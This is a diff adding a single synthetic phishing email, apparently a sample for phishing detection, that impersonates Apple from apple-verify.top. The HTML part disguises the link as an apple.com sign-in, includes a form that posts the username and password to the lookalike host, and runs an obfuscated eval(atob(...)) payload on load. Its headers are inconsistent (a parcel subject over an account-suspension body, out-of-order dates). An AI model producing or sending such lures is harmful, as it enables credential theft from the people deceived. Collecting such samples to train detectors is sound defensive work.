@@ -1,0 +1,31 @@
+From: notice@apple-verify.top
+To: victim25@example.com
+Subject: Your parcel could not be delivered - click here
+Date: Tue, 08 Mar 2002 20:00:00 -0500
+Message-ID: <phish-25-7d295fc4-3130-40de-8e4d-03ce77abbf45@apple-verify.top>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 16 Mar 2002 19:22:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 10 Mar 2002 14:15:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 03 Mar 2002 10:15:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 27 Mar 2002 02:35:00 -0500
+Return-Path: <bounce@mail-30387ab3.top>
+Reply-To: recovery5@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-30387ab3.top; dkim=fail header.d=apple-verify.top; dmarc=fail header.from=apple-verify.top
+Received-SPF: fail (mx.example.com: domain of notice@apple-verify.top does not designate 198.51.100.24 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=apple-verify.top; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-25-9f3851"
+
+--bnd-p-25-9f3851
+Content-Type: text/plain; charset="UTF-8"
+
+Dear customer,
+
+We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.
+http://apple-verify.top/login
+
+Reference: P6AE249
+--bnd-p-25-9f3851
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Dear customer,<br/><br/>We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.<br/>http://apple-verify.top/login<br/><br/>Reference: P6AE249</p><p><a href="http://apple-verify.top/login">https://www.apple.com/signin</a></p><form action="http://apple-verify.top/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-25-9f3851--
